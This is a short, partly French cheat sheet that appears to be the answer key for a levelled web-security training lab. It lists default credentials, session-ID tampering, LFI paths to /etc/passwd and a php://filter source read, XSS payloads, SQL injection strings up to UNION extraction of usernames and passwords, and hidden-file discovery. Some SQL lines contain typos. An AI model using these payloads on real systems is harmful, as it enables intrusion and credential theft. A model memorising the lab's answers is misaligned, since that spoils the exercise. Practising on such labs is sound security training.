# Cheatsheet

## Broken authentication
Level 1
admin:password

- weak password
- default password
- GET parameters


Level 2

alice:123456789

- error message


## Broken Access Control
?sessionid=120983


## LFI

?topic=../../../../../../etc/passwd
?topic=php://filter/convert.base64-encode/resource=secret.php

## XSS
Level 1
<script>alert('XSS')</script>

Level 2
<script>alert('XSS')</script>

Modifier le contenu du premier message : 
<script>document.getElementsByTagName("p").item(1).innerHTML="Modifié par un hacker"</script>

Level 3 
Uniquement pseudo

Level 4
<img src="x" onerror="alert('XSS')"/>


## SQLi
Level 1
' or 1=1; -- 
a

admin' and 1=1; -- 
Level 2
uniquement password 
' or 1=1; --


Level 3
' union select null; -- 
' union select 'a','b','c','d'; -- 
' UNION select null, table_name,null,null from information_schema.tables; -- 
' UNION select null, column_name,null,null from information_schema.comluns where table_name='sql1'; -- 
' union select null,username,password,null from table='sql1'; --


5 secrets : 


1 - fuzzing 
secret.php

robots.txt => /96bd94aa09f61018abeaf0cd7b7c6387.php

code source => 33a2838ab91f7f01a24da38cb55cae10.php

?topic=php://filter/convert.base64-encode/resource=secret.php

Extract .git 
git restore .